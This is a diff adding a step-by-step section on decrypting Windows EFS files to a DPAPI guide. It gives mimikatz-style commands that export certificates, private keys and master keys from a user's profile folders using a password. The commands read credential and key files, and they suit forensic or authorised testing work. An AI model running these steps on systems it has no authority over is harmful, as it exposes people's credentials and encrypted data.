@@ -52,5 +52,52 @@ Final decryption
 
         dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"
 
+4) Decrypt Encrypted File System (EFS) Files
 
+Decrypting EFS files involves:
 
+#### 1) Retrieving and exporting the necessary certificate
+
+#### 2) Locating and exporting the associated private key
+
+#### 3) Decrypting the master key using the user password
+
+#### 4) Using the decrypted master key to decrypt the private key
+
+#### 5) Applying the decrypted private key to access the encrypted file
+
+### PREREQUISITES:
+
+#### 1) Encrypted file(s) access on a Windows System
+
+#### 2) User's systemCertificates, Crypto and Protect folders. Location:
+
+       C:\Users\USERNAME\AppData\Roaming\Microsoft
+
+#### 3) Master key or a way to decrypt it. It can be any of the following: User's password, SHA1, NTLM, Domain Backup Key or a memory dump. We will use a password for this example.
+
+### STEPS:
+
+1) Get information about the encrypted file (Provides details like the certificate's fingerprint for example)
+
+       cipher /c "C:\Users\USERNAME\Documents\encrypted.txt"
+
+2) Export the certificate (This command saves the certificate to a .der file)
+
+       crypto::system /file:"C:\Users\USERNAME\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\G89ED7G8DF6G8DGDF9878GV98DF" /export
+
+3) Locate and export the Private Key
+
+       dpapi::capi /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-22353253535-164576453735-12352462464-1001\78fed6gf87edg687e6gg_e7fgegferger-jj54-dd09-214f-fwesfsefs"
+
+#### TIP: Check if the pUniqueName field matches the container name from the certificate export step
+
+4) Decrypt the Master Key
+
+       dpapi::masterkey /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Protect\S-1-5-21-22353253535-164576453735-12352462464-1001\1oiknjui1jkhui-4771-4578-o90x-fefs89f7s9" /password:USERPASS
+
+5) Decrypt the Private Key
+
+       dpapi::capi /masterkey:DECRYPTED_MASTERKEY /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-22353253535-164576453735-12352462464-1001\78fed6gf87edg687e6gg_e7fgegferger-jj54-dd09-214f-fwesfsefs"
+
+6) Decrypt the EFS file (Use the decrypted key. This step may involve using additional tools or scripts to apply the private key and decrypt the file content)
